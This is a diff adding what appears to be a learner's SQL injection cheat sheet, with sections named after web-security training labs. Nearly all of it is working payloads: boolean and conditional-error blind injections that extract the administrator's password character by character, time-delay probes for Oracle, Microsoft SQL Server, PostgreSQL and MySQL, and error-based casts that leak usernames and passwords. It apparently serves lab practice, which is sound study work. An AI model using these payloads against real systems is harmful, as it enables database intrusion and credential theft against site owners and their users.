@@ -1,0 +1,46 @@
+#Blind SQL injection with conditional responses
+
+' and (select 'x' from users LIMIT 1)='x'-- -
+
+' and (select username from users where username='administrator')='administrator'-- -
+
+' and (select username from users where username='administrator' and LENGTH(password)>1)='administrator'-- -
+
+' and (select SUBSTRING(password,1,1) from users where username='administrator')='a'-- -
+
+
+
+#Blind SQL injection with conditional errors
+
+' || (select ' ') || ' >> Non Oracle
+
+' || (select ' ' from dual) || ' >> Oracle
+
+select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END from users where username='administrator' >> Oracle #500 error means exists.
+
+select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END from users where username='administrator' and LENGTH(password)>20 >> Oracle #500 error means exists.
+
+select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END from users where username='administrator' and SUBSTRING(password,1,1)='a' >> Oracle #500 error means exists.
+
+
+
+#Blind SQL injection with time delays
+
+' || (dbms_pipe.receive_message(('a'),10))-- - >> Oracle
+
+' || (WAITFOR DELAY '0:0:10')-- - >> Microsoft
+
+' ||  (SELECT pg_sleep(10))-- - >> PostgreSQL
+
+' ||  (SELECT SLEEP(10))-- - >> MySQL
+
+
+
+#Visible Error-Based Sql Injection
+
+'||cast((select version() LIMIT 1) AS INT)--
+
+'||cast((select username from users LIMIT 1) AS INT)--  >> cast for PostgreSQL
+
+'||cast((select password from users LIMIT 1) AS INT)--
+
